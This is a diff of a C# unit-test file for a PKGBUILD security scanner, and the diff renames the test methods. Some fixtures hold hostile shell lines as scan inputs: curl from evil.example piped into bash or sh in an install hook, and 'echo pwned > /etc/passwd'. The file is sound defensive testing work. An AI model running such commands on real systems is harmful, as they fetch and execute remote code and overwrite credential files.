@@ -134,7 +134,7 @@ public class PkgBuildSecurityScannerTests
     }
 
     [Fact]
-    public void Clean_pkgbuild_has_no_findings_and_verifies()
+    public void Scan_CleanPkgBuild_VerifiesWithoutFindings()
     {
         var result = Scan(("PKGBUILD", "pkgname=foo\npkgver=1.0\nsource=(\"https://example.com/foo.tar.gz\")\n"));
 
@@ -143,7 +143,7 @@ public class PkgBuildSecurityScannerTests
     }
 
     [Fact]
-    public void Write_to_etc_is_high_and_flags()
+    public void Scan_PkgBuildWriteToEtc_FlagsWriteOutsideBuildRoot()
     {
         var result = Scan(("PKGBUILD", "echo pwned > /etc/passwd\n"));
 
@@ -152,7 +152,7 @@ public class PkgBuildSecurityScannerTests
     }
 
     [Fact]
-    public void Install_scriptlet_is_scanned()
+    public void Scan_InstallScriptletContent_FlagsNetworkToShell()
     {
         var result = Scan(("foo.install", "post_install() { curl https://evil.example/x | bash; }\n"));
 
@@ -160,7 +160,7 @@ public class PkgBuildSecurityScannerTests
     }
 
     [Fact]
-    public void Privilege_escalation_in_install_scriptlet_is_medium_and_does_not_block()
+    public void Scan_PrivilegeEscalationInInstallScriptlet_DowngradesToMedium()
     {
         // Scriptlets already run as root under alpm's control: sudo inside one is
         // redundant, not an escalation.
@@ -172,7 +172,7 @@ public class PkgBuildSecurityScannerTests
     }
 
     [Fact]
-    public void Write_outside_build_root_in_install_scriptlet_is_medium_and_does_not_block()
+    public void Scan_WriteOutsideBuildRootInInstallScriptlet_DowngradesToMedium()
     {
         var result = Scan(("foo.install", "post_install() {\n  echo /bin/zsh >> /etc/shells\n}\n"));
 
@@ -182,7 +182,7 @@ public class PkgBuildSecurityScannerTests
     }
 
     [Fact]
-    public void Obfuscated_write_in_install_scriptlet_is_medium_and_does_not_block()
+    public void Scan_ObfuscatedWriteInInstallScriptlet_DowngradesToMedium()
     {
         // upak regression: the \/root artifact escalated to Critical before the scriptlet
         // context was taken into account.
@@ -194,7 +194,7 @@ public class PkgBuildSecurityScannerTests
     }
 
     [Fact]
-    public void Privilege_escalation_in_helper_script_does_not_block()
+    public void Scan_PrivilegeEscalationInHelperScript_DowngradesToMedium()
     {
         // Helper scripts ship in the package and only run when the user invokes them
         // voluntarily, typically as root: sudo inside one grants nothing new. The
@@ -208,7 +208,7 @@ public class PkgBuildSecurityScannerTests
     }
 
     [Fact]
-    public void Write_outside_build_root_in_helper_script_still_flags()
+    public void Scan_WriteOutsideBuildRootWithoutPkgBuild_StaysFlagged()
     {
         // No PKGBUILD in the file set, so there is no reference to check: the
         // conservative answer keeps the write blocking.
@@ -220,7 +220,7 @@ public class PkgBuildSecurityScannerTests
     }
 
     [Fact]
-    public void Write_outside_build_root_in_referenced_helper_script_still_flags()
+    public void Scan_WriteOutsideBuildRootInReferencedHelperScript_StaysFlagged()
     {
         // The PKGBUILD invokes the script from build(), so its writes execute at
         // build time and keep blocking.
@@ -234,7 +234,7 @@ public class PkgBuildSecurityScannerTests
     }
 
     [Fact]
-    public void Write_outside_build_root_in_unreferenced_helper_script_does_not_block()
+    public void Scan_WriteOutsideBuildRootInUnreferencedHelperScript_DowngradesToMedium()
     {
         // ferdium-bin regression: the maintainer-only docker build/release scripts
         // (build-in-docker.sh, build.sh, dockerscript.sh, update.sh) are never invoked
@@ -259,7 +259,7 @@ public class PkgBuildSecurityScannerTests
     }
 
     [Fact]
-    public void Write_outside_build_root_in_script_only_staged_into_pkgdir_does_not_block()
+    public void Scan_ScriptOnlyStagedIntoPkgDir_DowngradesToMedium()
     {
         // ccache-ext regression: update-ccache-links.sh appears in the PKGBUILD only as a
         // source-array entry and an install into $pkgdir - it runs later, on the user's
@@ -291,7 +291,7 @@ public class PkgBuildSecurityScannerTests
     }
 
     [Fact]
-    public void Write_outside_build_root_in_script_only_staged_at_a_relative_path_does_not_block()
+    public void Scan_ScriptOnlyStagedAtRelativePathFromPkgDir_DowngradesToMedium()
     {
         // crashplan-pro regression: upgrade.sh appears only in the source array and an
         // install whose destination is relative to a cd into $pkgdir - it runs later, on
@@ -327,7 +327,7 @@ public class PkgBuildSecurityScannerTests
     }
 
     [Fact]
-    public void Relative_destination_cp_in_build_does_not_count_as_invocation()
+    public void Scan_CpToRelativeDestinationInBuild_DowngradesToMedium()
     {
         // A transport command never executes its operand, and a relative destination
         // lands inside the build tree even without a pkgdir literal.
@@ -350,7 +350,7 @@ public class PkgBuildSecurityScannerTests
     }
 
     [Fact]
-    public void Source_array_mention_with_typed_invocation_still_blocks()
+    public void Scan_TypedInvocationInBuild_StaysFlagged()
     {
         // Declaring the script in source= stages it, but the typed ./helper.sh
         // invocation in build() is what runs it - the write stays blocking.
@@ -373,7 +373,7 @@ public class PkgBuildSecurityScannerTests
     }
 
     [Fact]
-    public void Inline_comment_after_staging_destination_does_not_count_as_invocation()
+    public void Scan_InlineCommentAfterStagingDestination_DowngradesToMedium()
     {
         var result = Scan(
             ("PKGBUILD", "pkgname=foo\ninstall -Dm755 helper.sh $pkgdir/usr/bin/helper # packaged helper\n"),
@@ -385,7 +385,7 @@ public class PkgBuildSecurityScannerTests
     }
 
     [Fact]
-    public void Comment_mention_stays_conservatively_referenced()
+    public void Scan_CommentMentionOfHelperScript_StaysFlagged()
     {
         var result = Scan(
             ("PKGBUILD", "pkgname=foo\n# helper.sh may be run manually\n"),
@@ -397,7 +397,7 @@ public class PkgBuildSecurityScannerTests
     }
 
     [Fact]
-    public void Invocation_after_source_array_on_the_same_line_still_blocks()
+    public void Scan_InvocationAfterSourceArrayOnSameLine_StaysFlagged()
     {
         var result = Scan(
             ("PKGBUILD", "pkgname=foo\nsource=(helper.sh); bash helper.sh\n"),
@@ -409,7 +409,7 @@ public class PkgBuildSecurityScannerTests
     }
 
     [Fact]
-    public void Invocation_after_staging_command_on_the_same_line_still_blocks()
+    public void Scan_InvocationAfterStagingCommandOnSameLine_StaysFlagged()
     {
         var result = Scan(
             ("PKGBUILD", "pkgname=foo\ninstall -Dm755 helper.sh $pkgdir/usr/bin/helper; bash helper.sh\n"),
@@ -421,7 +421,7 @@ public class PkgBuildSecurityScannerTests
     }
 
     [Fact]
-    public void Non_data_array_mention_still_blocks()
+    public void Scan_MentionInNonDataArray_StaysFlagged()
     {
         // Only makepkg data arrays (source, checksums, …) stage their entries; a mention
         // in any other array is treated as code the PKGBUILD reaches.
@@ -435,7 +435,7 @@ public class PkgBuildSecurityScannerTests
     }
 
     [Fact]
-    public void Staging_to_system_path_still_blocks()
+    public void Scan_StagingToSystemPath_StaysFlagged()
     {
         // The transport exemption covers staging into $pkgdir only: copying the script
         // straight to a system path is itself out-of-root behavior and keeps the mention.
@@ -456,7 +456,7 @@ public class PkgBuildSecurityScannerTests
     }
 
     [Fact]
-    public void Install_scriptlet_entry_counts_as_a_reference()
+    public void Scan_InstallScriptletReference_DowngradesToMedium()
     {
         // The scriptlet is wired up via install=, so its writes run under alpm's
         // control and take the scriptlet verdict, not the unreferenced one.
@@ -471,7 +471,7 @@ public class PkgBuildSecurityScannerTests
     }
 
     [Fact]
-    public void Obfuscated_write_in_unreferenced_helper_script_stays_critical()
+    public void Scan_ObfuscatedWriteInUnreferencedHelperScript_StaysCritical()
     {
         var result = Scan(
             ("PKGBUILD", "pkgname=foo\npkgver=1.0\n"),
@@ -483,7 +483,7 @@ public class PkgBuildSecurityScannerTests
     }
 
     [Fact]
-    public void Helper_script_sensors_eval_does_not_block()
+    public void Scan_SensorsEvalInHelperScript_DowngradesToMedium()
     {
         // Corpus regression fixture (baraction.sh): the eval'd text comes from the local
         // hardware monitor piped through local parsers.
@@ -495,7 +495,7 @@ public class PkgBuildSecurityScannerTests
     }
 
     [Fact]
-    public void Heredoc_help_text_mentioning_sudo_does_not_block()
+    public void Scan_HeredocHelpTextMentioningSudo_NotFlagged()
     {
         var result = Scan(("PKGBUILD", "cat <<'EOF'\n## After editing run: sudo systemctl restart foo\nEOF\n"));
 
@@ -504,7 +504,7 @@ public class PkgBuildSecurityScannerTests
     }
 
     [Fact]
-    public void Quoted_uninstall_instructions_in_scriptlet_do_not_block()
+    public void Scan_QuotedUninstallInstructionsInScriptlet_NotFlagged()
     {
         // Help text printed for the user: the pipe sits inside a quoted string, so
         // nothing is actually piped into a shell.
@@ -520,7 +520,7 @@ public class PkgBuildSecurityScannerTests
     }
 
     [Fact]
-    public void Perl_release_tag_scraping_does_not_block()
+    public void Scan_PerlReleaseTagScraping_NotNetworkExecution()
     {
         // perl runs its inline -pe program on the download as stdin data; the fetch
         // itself stays visible as a Medium risky-tool finding.
@@ -533,7 +533,7 @@ public class PkgBuildSecurityScannerTests
     }
 
     [Fact]
-    public void Answer_feeding_local_installer_does_not_block()
+    public void Scan_AnswerFeedingIntoLocalInstaller_Verifies()
     {
         // bash executes the local script file; the piped answer is only its stdin data.
         var result = Scan(("PKGBUILD", "package() {\n  echo n | bash ./install.sh --prefix=\"$pkgdir\" > /dev/null\n}\n"));
@@ -542,7 +542,7 @@ public class PkgBuildSecurityScannerTests
     }
 
     [Fact]
-    public void Non_script_binary_file_is_not_scanned()
+    public void Scan_NonScriptBinaryFile_NotScanned()
     {
         var result = Scan(("data.bin", "curl https://evil.example/x | sh\n"));
 
@@ -551,7 +551,7 @@ public class PkgBuildSecurityScannerTests
     }
 
     [Fact]
-    public void Local_elf_is_critical_while_binary_data_is_medium()
+    public void Scan_LocalElfAndBinaryData_SeparatesCriticalFromMedium()
     {
         // Repository files reach the scanner as UTF-8-decoded strings, so decode
         // real on-disk bytes instead of relying on string escapes. This mirrors
@@ -576,7 +576,7 @@ public class PkgBuildSecurityScannerTests
     }
 
     [Fact]
-    public void Local_source_file_with_only_invalid_utf8_is_retained_medium()
+    public void Scan_InvalidUtf8OnlyLocalSource_RetainedMedium()
     {
         // A lone continuation byte (0x80) is not valid UTF-8 and decodes to the
         // replacement character (U+FFFD). With no NUL or control characters present the
@@ -592,7 +592,7 @@ public class PkgBuildSecurityScannerTests
     }
 
     [Fact]
-    public void Scanner_is_deterministic()
+    public void Scan_SameInputRepeated_IsDeterministic()
     {
         var files = new[] { ("PKGBUILD", "curl https://evil.example/x.sh | sh\n") };
         var first = Scan(files);
@@ -602,7 +602,7 @@ public class PkgBuildSecurityScannerTests
     }
 
     [Fact]
-    public void Shelly_pkgbuild_is_verified_with_only_expected_command_substitution_findings()
+    public void Scan_ShellyPkgBuild_VerifiesWithOnlyCommandSubstitutionFindings()
     {
         // The fourth historical finding - $(basename ...) inside the <<'SCRIPT' heredoc
         // body - is suppressed: a quoted delimiter makes the body literal data.
@@ -618,7 +618,7 @@ public class PkgBuildSecurityScannerTests
     }
 
     [Fact]
-    public void Inert_media_source_files_are_medium_and_do_not_block()
+    public void Scan_InertMediaSourceFiles_DowngradesToMedium()
     {
         var png = Encoding.UTF8.GetString([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, .. new byte[16]]);
         var pdf = "%PDF-1.7\nstream\n\0\0binary\nendstream\n";
@@ -637,7 +637,7 @@ public class PkgBuildSecurityScannerTests
     }
 
     [Fact]
-    public void Unrecognized_binary_source_files_are_medium_and_do_not_block()
+    public void Scan_UnrecognizedBinarySourceFiles_DowngradesToMedium()
     {
         // Only recognized executable formats (ELF, PE) block; opaque binary data is
         // retained for review at Medium.
@@ -649,7 +649,7 @@ public class PkgBuildSecurityScannerTests
     }
 
     [Fact]
-    public void Homograph_url_with_invisible_character_is_medium_and_does_not_block()
+    public void Scan_HomographUrlWithInvisibleCharacter_DowngradesToMedium()
     {
         // Corpus regression fixture (poweriso-gui): U+0670, an invisible combining mark,
         // is prepended to the url scheme. The package looks clean on inspection, and the
@@ -663,7 +663,7 @@ public class PkgBuildSecurityScannerTests
     }
 
     [Fact]
-    public void Homograph_lookalike_source_host_is_medium_and_does_not_block()
+    public void Scan_HomographLookalikeSourceHost_DowngradesToMedium()
     {
         // Cyrillic i (U+0456) spoofing the host of a download URL. Corpus-driven: every
         // stored homograph finding proved benign, so the rule is kept visible at Medium.
